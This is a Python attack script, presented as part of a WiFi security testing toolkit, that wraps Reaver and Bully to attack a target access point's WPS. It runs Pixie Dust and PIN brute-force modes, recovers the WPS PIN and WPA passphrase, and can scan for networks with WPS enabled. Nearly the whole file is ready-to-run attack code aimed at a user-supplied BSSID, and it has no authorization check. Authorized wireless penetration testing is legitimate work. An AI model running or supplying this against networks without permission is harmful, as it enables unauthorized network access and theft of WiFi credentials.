"""
WiFi Security Testing Toolkit — WPS PIN Attack
Attacks WiFi Protected Setup using Pixie Dust and brute-force PIN methods.
"""

from __future__ import annotations

import subprocess
import re
import time
import sys
import os
from dataclasses import dataclass
from pathlib import Path
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

from monitor import InterfaceManager


@dataclass
class WPSResult:
    bssid: str
    ssid: str
    pin: str | None = None
    password: str | None = None
    method: str = ""  # "pixie" or "brute"
    attempts: int = 0
    elapsed: float = 0.0
    success: bool = False


class WPSAttack:
    """
    WPS PIN attack using Reaver or Bully.

    Two modes:
    1. Pixie Dust attack — exploits weak RNG in some chipsets (instant)
    2. PIN brute force — tries all 11,000 possible PINs (slow but universal)
    """

    @staticmethod
    def check_wps(iface: str, bssid: str) -> bool:
        """Check if the AP has WPS enabled using wash (reaver's scanner)."""
        try:
            result = subprocess.run(
                ["wash", "-i", iface, "--ignore-fcs"],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.splitlines():
                if bssid.lower() in line.lower():
                    if "Yes" in line or "1.0" in line or "2.0" in line:
                        return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return False

    @classmethod
    def pixie_dust(cls, iface: str, bssid: str, channel: int,
                   ssid: str = "", pin: str | None = None,
                   timeout: int = 120) -> WPSResult:
        """
        Pixie Dust attack — exploits weak E-S1/E-S2 nonce generation.
        Works on many Broadcom, Realtek, and MediaTek chipsets.
        """
        InterfaceManager.require_root()
        InterfaceManager.set_channel(iface, channel)

        print(f"[*] Pixie Dust attack on {bssid} ({ssid}) channel {channel}")

        cmd = [
            "reaver",
            "-i", iface,
            "-b", bssid,
            "-c", str(channel),
            "-K", "1",  # Pixie Dust mode
            "-vv",
        ]
        if pin:
            cmd.extend(["-p", pin])

        start = time.time()
        result = WPSResult(bssid=bssid, ssid=ssid, method="pixie")

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True
            )

            pin_found = None
            psk_found = None
            attempts = 0

            try:
                for line in iter(proc.stdout.readline, ""):
                    print(f"    {line.rstrip()}")

                    pin_match = re.search(r"WPS PIN:\s*['\"]?(\d{8})", line)
                    if pin_match:
                        pin_found = pin_match.group(1)

                    psk_match = re.search(r"WPA PSK:\s*['\"]?([^\s'\"]+)", line)
                    if psk_match:
                        psk_found = psk_match.group(1)

                    attempts_match = re.search(r"(\d+)\s*(?:\.\d+%)?\s*complete", line)
                    if attempts_match:
                        attempts = int(attempts_match.group(1))

                    if pin_found and psk_found:
                        break

                    if time.time() - start > timeout:
                        proc.terminate()
                        break
            except Exception:
                pass

            proc.wait(timeout=10)

            result.pin = pin_found
            result.password = psk_found
            result.attempts = attempts
            result.elapsed = time.time() - start

            if pin_found and psk_found:
                result.success = True
                print(f"\n[+] PIXIE DUST SUCCESS!")
                print(f"    PIN:  {pin_found}")
                print(f"    PSK:  {psk_found}")
                print(f"    Time: {result.elapsed:.1f}s")
            else:
                print(f"\n[-] Pixie Dust failed ({result.elapsed:.1f}s)")

        except FileNotFoundError:
            print("[!] reaver not found. Install with: apt install reaver")
        except Exception as e:
            print(f"[!] Error: {e}")

        return result

    @classmethod
    def bully_attack(cls, iface: str, bssid: str, channel: int,
                     ssid: str = "", pin: str | None = None,
                     timeout: int = 300) -> WPSResult:
        """
        Alternative WPS attack using Bully (often faster than Reaver).
        """
        InterfaceManager.set_channel(iface, channel)

        print(f"[*] Bully WPS attack on {bssid} ({ssid}) channel {channel}")

        cmd = [
            "bully",
            iface,
            "-b", bssid,
            "-c", str(channel),
            "-v", "3",
        ]
        if pin:
            cmd.extend(["-p", pin])

        start = time.time()
        result = WPSResult(bssid=bssid, ssid=ssid, method="bully")

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True
            )

            pin_found = None
            psk_found = None

            try:
                for line in iter(proc.stdout.readline, ""):
                    print(f"    {line.rstrip()}")

                    pin_match = re.search(r"pin:\s*['\"]?(\d{8})", line, re.I)
                    if pin_match:
                        pin_found = pin_match.group(1)

                    psk_match = re.search(r"key:\s*['\"]?([^\s'\"]+)", line, re.I)
                    if psk_match:
                        psk_found = psk_match.group(1)

                    if "PIN" in line and "Found" in line:
                        pin_match = re.search(r"(\d{8})", line)
                        if pin_match:
                            pin_found = pin_match.group(1)

                    if pin_found and psk_found:
                        break
                    if time.time() - start > timeout:
                        proc.terminate()
                        break
            except Exception:
                pass

            proc.wait(timeout=10)

            result.pin = pin_found
            result.password = psk_found
            result.elapsed = time.time() - start

            if pin_found and psk_found:
                result.success = True
                print(f"\n[+] BULLY SUCCESS!")
                print(f"    PIN:  {pin_found}")
                print(f"    PSK:  {psk_found}")
                print(f"    Time: {result.elapsed:.1f}s")
            else:
                print(f"\n[-] Bully failed ({result.elapsed:.1f}s)")

        except FileNotFoundError:
            print("[!] bully not found. Install with: apt install bully")
        except Exception as e:
            print(f"[!] Error: {e}")

        return result

    @classmethod
    def scan_wps_networks(cls, iface: str) -> list[dict]:
        """Scan for WPS-enabled networks."""
        InterfaceManager.require_root()

        networks = []
        try:
            result = subprocess.run(
                ["wash", "-i", iface, "--ignore-fcs", "-j"],
                capture_output=True, text=True, timeout=60
            )
            import json
            try:
                data = json.loads(result.stdout)
                if isinstance(data, list):
                    networks = data
                elif isinstance(data, dict):
                    networks = data.get("wps", [])
            except json.JSONDecodeError:
                for line in result.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 5:
                        networks.append({
                            "bssid": parts[0],
                            "channel": parts[1],
                            "rssi": parts[2],
                            "wps_version": parts[3] if len(parts) > 3 else "",
                            "ssid": parts[5] if len(parts) > 5 else "",
                        })
        except FileNotFoundError:
            print("[!] wash (reaver) not found. Install: apt install reaver")

        return networks


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="WPS PIN Attack")
    parser.add_argument("iface", help="Monitor mode interface")
    parser.add_argument("bssid", help="Target BSSID")
    parser.add_argument("-c", "--channel", type=int, required=True,
                        help="Target channel")
    parser.add_argument("-s", "--ssid", default="",
                        help="Target SSID")
    parser.add_argument("-p", "--pin", type=str, default=None,
                        help="Known/suspected PIN (skips brute force)")
    parser.add_argument("--pixie", action="store_true", default=True,
                        help="Use Pixie Dust attack (default)")
    parser.add_argument("--bully", action="store_true",
                        help="Use Bully instead of Reaver")
    parser.add_argument("--timeout", type=int, default=120,
                        help="Timeout in seconds")
    parser.add_argument("--scan", action="store_true",
                        help="Scan for WPS networks only")
    args = parser.parse_args()

    if args.scan:
        networks = WPSAttack.scan_wps_networks(args.iface)
        for net in networks:
            print(f"  {net.get('bssid', '?')}  CH:{net.get('channel', '?')}  "
                  f"RSSI:{net.get('rssi', '?')}  "
                  f"WPS:{net.get('wps_version', '?')}  "
                  f"SSID:{net.get('ssid', '?')}")
        sys.exit(0)

    # Check WPS first
    print(f"[*] Checking WPS status for {args.bssid}...")
    if not WPSAttack.check_wps(args.iface, args.bssid):
        print(f"[-] No WPS detected on {args.bssid}")
        sys.exit(1)
    print(f"[+] WPS is enabled!")

    if args.bully:
        result = WPSAttack.bully_attack(
            args.iface, args.bssid, args.channel,
            ssid=args.ssid, pin=args.pin, timeout=args.timeout,
        )
    else:
        result = WPSAttack.pixie_dust(
            args.iface, args.bssid, args.channel,
            ssid=args.ssid, pin=args.pin, timeout=args.timeout,
        )

    if result.success:
        print(f"\n[+] SUCCESS: {result.ssid} | PIN: {result.pin} | "
              f"PSK: {result.password}")
